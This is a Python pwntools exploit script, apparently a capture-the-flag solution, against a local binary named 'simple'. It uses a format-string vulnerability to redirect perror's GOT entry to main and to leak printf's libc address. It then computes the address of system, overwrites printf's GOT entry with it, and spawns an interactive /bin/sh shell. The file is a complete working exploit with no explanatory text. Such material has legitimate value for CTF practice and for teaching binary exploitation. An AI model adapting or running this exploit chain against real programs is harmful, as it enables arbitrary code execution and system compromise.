from pwn import *

elf = ELF("./simple")
libc = ELF("./libc.so.6")


#break *0x400702
#p = gdb.debug(elf.path,'''
#    continue
#''')
p = process(elf.path)

buf = b"%" + str(elf.symbols['main']).encode() + b"c"
buf += b"%8$n"
buf += b"A" * (16 - len(buf))
buf += p64(elf.got['perror'])

# for debug
#buf += p64(0x601048)
#buf += p64(0x400399)
print(buf)


p.send(buf)
p.recvuntil(b"\x10`")

buf = b"%7$sAAAA"
buf += p64(elf.got['printf'])

print(buf)
p.send(buf)
printf_leak_addr = u64(p.recvuntil("AAAA")[:-4] + b'\x00\x00')
libc_base = printf_leak_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
log.info("printf_leak_addr = " + hex(printf_leak_addr))
log.info("libc_base = " + hex(libc_base))
log.info("system_addr = " + hex(system_addr))

p.recvuntil(b"\x10`")

buf = b"%" + str(system_addr & 0xffff).encode() + b"c"
buf += b"%10$hn"
buf += b"%" + str(((system_addr >> 16) & 0xffff) - (system_addr & 0xffff)).encode()  + b"c"
buf += b"%11$hn"
buf += b"B" * (32 - len(buf))

buf += p64(elf.got['printf'])
buf += p64(elf.got['printf'] + 2)

# for debug
#buf += p64(0x601048 )
#buf += p64(0x601048 + 2 )


print(buf)
p.send(buf)

p.recvuntil(b"\x10`")
p.sendline(b"/bin/sh\x00")

p.interactive()

